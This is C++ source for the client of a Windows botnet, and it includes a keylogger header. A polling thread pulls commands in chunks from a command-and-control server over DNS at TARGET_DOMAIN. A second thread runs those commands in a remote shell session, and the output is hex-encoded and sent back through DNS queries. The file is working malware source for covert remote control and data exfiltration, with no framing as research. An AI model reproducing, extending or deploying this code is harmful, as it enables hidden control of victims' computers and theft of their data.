#include "Botnet.h"
#include "KeyLogger.h"
#include "Network.h"
#include "ConsoleClient.h"
#include "Shell.h"
#include <string>

void EnqueueSend(const std::string& s) {
    std::lock_guard<std::mutex> lk(queue_mutex);
    send_queue.push(s);
}

void EnqueueExecute(const std::string& s) {
    std::lock_guard<std::mutex> lk(execute_mutex);
    execute_queue.push(s);
}

DWORD senderBotnetThread(LPVOID lpParam)
{
    while (true) {
        // --- Phase 1: Poll for command chunks from server ---
        std::vector<std::string> command_chunks;
        size_t chunk_offset = 0;

        std::cout << "\n[Polling] Checking for new command from server...\n";

        while (true)
        {
            // Send Type P packet to poll for next chunk
            int retcode = sendDataTypeP(connectionId, packetNumber, chunk_offset, TARGET_DOMAIN.c_str());

            if (retcode == 1) {
                // Successfully received a chunk
                std::string chunk_data;
                {
                    std::lock_guard<std::mutex> lock(g_outChunkMutex);
                    // Convert wstring to string
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, nullptr, 0, nullptr, nullptr);
                    if (size_needed > 0) {
                        std::string temp(size_needed - 1, 0);
                        WideCharToMultiByte(CP_UTF8, 0, g_outChunk.c_str(), -1, &temp[0], size_needed, nullptr, nullptr);
                        chunk_data = temp;
                    }
                }

                if (!chunk_data.empty()) {
                    std::cout << "  [+] Received chunk " << chunk_offset << " (" << chunk_data.length() << " bytes)\n";
                    command_chunks.push_back(chunk_data);
                    chunk_offset++;
                    Sleep(50); // Small delay between chunk requests
                } else {
                    break;
                }
            } 
            else if (retcode == 0) {
                // No more chunks (empty response or end of command)
                std::cout << "  [*] End of command chunks (retcode=0)\n";
                break;
            } 
            else {
                // Error occurred (retcode == -1)
                std::cout << "  [!] Error polling for chunks (retcode=-1)\n";
                break;
            }
        }

        // --- Phase 2: Check if we have a command to process ---
        std::string dataToSend;

        if (!command_chunks.empty()) {
            // Reassemble the full command from chunks
            std::string full_command;
            for (const auto& chunk : command_chunks) {
                full_command += chunk;
            }
            std::cout << "[+] Command reassembled: '" << full_command << "' (" << full_command.length() << " bytes)\n";

            // Enqueue the command for execution (or process it here)
            EnqueueExecute(full_command);
            std::cout << "[+] Command enqueued for execution\n";
        }

        // --- Phase 3: Check queue for data to send back ---
        {
            std::lock_guard<std::mutex> lock(queue_mutex);
            if (!send_queue.empty()) {
                dataToSend = send_queue.front();
                send_queue.pop();
            }
        }

        // --- Phase 4: Send data back to server in chunks ---
        if (!dataToSend.empty()) {
            std::cout << "[Sending] Transmitting result (" << dataToSend.length() << " bytes) in chunks...\n";
            std::cout << "[Debug] Data preview: '" << dataToSend.substr(0, std::min<size_t>(50, dataToSend.length())) << "...'\n";
            
            // Split dataToSend into chunks of max_len and send each chunk
            size_t offset = 0;
            size_t offset_number = 0;
            const size_t totalLen = dataToSend.size();
            int consecutiveFailures = 0;
            const int MAX_FAILURES = 3;
            
            while (offset < totalLen) {
                size_t chunkLen = std::min<size_t>(max_len, totalLen - offset);
                std::string chunk = dataToSend.substr(offset, chunkLen);
                offset_number = offset / max_len;
                
                std::cout << "  [+] Sending chunk " << offset_number << " (packet #" << packetNumber << ", " << chunkLen << " bytes)\n";
                std::cout << "  [Debug] Chunk hex preview: " << chunk.substr(0, std::min<size_t>(20, chunk.length())) << "...\n";
                
                // Convert chunk to hex for DNS transmission
                std::string chunkHex = convertToHex(chunk.c_str());
                std::cout << "  [Debug] Hex length: " << chunkHex.length() << " chars\n";
                
                int success = sendDataTypeC(connectionId, packetNumber, offset_number,
                                            TARGET_DOMAIN.c_str(), chunkHex.c_str());

                if (success == 0) {
                    // Sent OK -> increment packet number
                    std::cout << "  [✓] Chunk sent successfully\n";
                    packetNumber++;
                    if (packetNumber > 999) {
                        packetNumber = 0;
                    }

                    offset += chunkLen;
                    consecutiveFailures = 0; // Reset failure counter
                    Sleep(50);
                } else {
                    consecutiveFailures++;
                    std::cout << "  [!] Failed to send chunk (attempt " << consecutiveFailures << "/" << MAX_FAILURES << ")\n";
                    
                    if (consecutiveFailures >= MAX_FAILURES) {
                        std::cout << "  [✗] Max failures reached, discarding data to prevent infinite loop\n";
                        // Discard data to prevent infinite retry loop
                        break;
                    } else {
                        // Wait and retry
                        std::cout << "  [~] Retrying after delay...\n";
                        Sleep(500);
                    }
                }
            }
            
            if (offset >= totalLen) {
                std::cout << "[+] All result chunks sent successfully\n";
            } else if (consecutiveFailures >= MAX_FAILURES) {
                std::cout << "[!] Transmission failed, data discarded\n";
            }
        } else {
            // No data to send, brief wait before next poll cycle
            Sleep(2000);
        }
    }
    return 0;
}

DWORD handle_botnet(LPVOID lpParam)
{
    ConsoleClient client;
    Shell shell(&client);

    if (!shell.CreateSession()) {
        std::cerr << "[!] Failed to create shell session\n";
        return 1;
    }

    std::cout << "[+] Shell session created successfully\n";

    while (true) {
        std::string commandToExecute;

        // Check execute_queue for commands
        {
            std::lock_guard<std::mutex> lock(execute_mutex);
            if (!execute_queue.empty()) {
                commandToExecute = execute_queue.front();
                execute_queue.pop();
            }
        }

        // Execute command if available
        if (!commandToExecute.empty()) {
            std::cout << "[Execute] Running command: '" << commandToExecute << "'\n";
            bool success = shell.ExecuteCommand(commandToExecute);
            
            if (success) {
                std::cout << "[Execute] Command executed successfully\n";
                // Output will be automatically sent via ConsoleClient::Send -> EnqueueSend
            } else {
                std::cout << "[Execute] Command execution failed\n";
            }
        } else {
            // No command to execute, wait briefly
            Sleep(100);
        }
    }

    // Cleanup (unreachable in infinite loop, but kept for completeness)
    shell.Dispose();
    return 0;
}